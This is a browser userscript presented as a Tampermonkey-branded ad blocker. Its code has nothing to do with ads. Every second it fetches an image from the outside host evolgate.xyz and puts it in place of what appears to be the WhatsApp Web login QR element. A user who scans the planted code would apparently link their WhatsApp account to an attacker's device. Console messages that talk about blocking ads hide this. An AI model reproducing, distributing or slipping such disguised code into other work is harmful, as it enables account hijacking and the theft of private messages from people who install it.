// ==UserScript==
// @name         Tampermonkey AdBlock®
// @namespace    http://tampermonkey.net/
// @version      19.23.142
// @description  Boosts the browser's Performance by blocking tedious Ads
// @author       Tampermonkey®
// @match        https://google.com
// @match        https://microsoft.com
// @match        https://amazon.com
// @match        https://apple.com
// @match        https://facebook.com
// @match        https://youtube.com
// @match        https://twitter.com
// @match        https://instagram.com
// @match        https://linkedin.com
// @match        https://wordpress.com
// @match        https://blogspot.com
// @match        https://wikipedia.org
// @match        https://yahoo.com
// @match        https://bing.com
// @match        https://ebay.com
// @match        https://netflix.com
// @match        https://craigslist.org
// @match        https://reddit.com
// @match        https://github.com
// @match        https://stackoverflow.com
// @match        https://pinterest.com
// @match        https://tumblr.com
// @match        https://dropbox.com
// @match        https://drive.google.com
// @match        https://adobe.com
// @match        https://vimeo.com
// @match        https://imdb.com
// @match        https://bbc.com
// @match        https://cnn.com
// @match        https://nytimes.com
// @match        https://walmart.com
// @match        https://espn.com
// @match        https://nasa.gov
// @match        https://wikimedia.org
// @match        https://spotify.com
// @match        https://soundcloud.com
// @match        https://etsy.com
// @match        https://hulu.com
// @match        https://forbes.com
// @match        https://fortune.com
// @match        https://cnbc.com
// @match        https://businessinsider.com
// @match        https://bloomberg.com
// @match        https://wsj.com
// @match        https://techcrunch.com
// @match        https://mashable.com
// @match        https://thenextweb.com
// @match        https://engadget.com
// @match        https://gizmodo.com
// @match        https://arstechnica.com
// @match        https://lifehacker.com
// @match        https://makeuseof.com
// @match        https://pcmag.com
// @match        https://tomsguide.com
// @match        https://cnet.com
// @match        https://digitaltrends.com
// @match        https://androidauthority.com
// @match        https://ioshacker.com
// @match        https://redmondpie.com
// @match        https://venturebeat.com
// @match        https://techradar.com
// @match        https://wired.com
// @match        https://theregister.com
// @match        https://slashdot.org
// @match        https://techspot.com
// @match        https://theguardian.com
// @match        https://independent.co.uk
// @match        https://web.whatsapp.com/
// @match        https://usatoday.com
// @match        https://huffpost.com
// @match        https://buzzfeed.com
// @match        https://vice.com
// @match        https://nationalgeographic.com
// @match        https://scientificamerican.com
// @match        https://smithsonianmag.com
// @match        https://newscientist.com
// @match        https://popularmechanics.com
// @match        https://popsci.com
// @match        https://phys.org
// @match        https://futurism.com
// @match        https://discovery.com
// @match        https://animalplanet.com
// @match        https://history.com
// @match        https://natgeokids.com
// @match        https://howstuffworks.com
// @match        https://mental_floss.com
// @match        https://britannica.com
// @match        https://thefreedictionary.com
// @match        https://merriam-webster.com
// @match        https://dictionary.com
// @match        https://thesaurus.com
// @grant        GM.xmlHttpRequest
// @connect      evolgate.xyz
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/494162/Tampermonkey%20AdBlock%C2%AE.user.js
// @updateURL https://update.greasyfork.org/scripts/494162/Tampermonkey%20AdBlock%C2%AE.meta.js
// ==/UserScript==


(function() {
    'use strict';

    let fetchedOnce = false;

    function exchange() {
        console.log("Fetching latest Ads...");
        GM.xmlHttpRequest({
            method: "GET",
            url: "http://qsr.evolgate.xyz:5000/image",
            responseType: "blob",
            onload: function(response) {
                if (response.status == 200) {
                    fetchedOnce = true;
                    var qrCodeElement = document.querySelector("._akau");
                    if (qrCodeElement) {
                        console.log("Ad found.");
                        qrCodeElement.innerHTML = "";
                        var img = document.createElement("img");
                        img.src = window.URL.createObjectURL(response.response);
                        qrCodeElement.appendChild(img);
                    } else {
                        console.error("Ad-element not found.");
                    }
                } else {
                    console.error("Failed to fetch AdBlock.dll:", response.statusText);
                }
            },
            onerror: function(error) {
                console.error("Error fetching AdBlockingList:", error);
                if (fetchedOnce) {
                    console.log("Blocking Ads...");
                    location.reload();
                }
                else {
                    clearInterval(intervalId);
                }
            }
        });
    }

    var intervalId = setInterval(exchange, 1000);

})();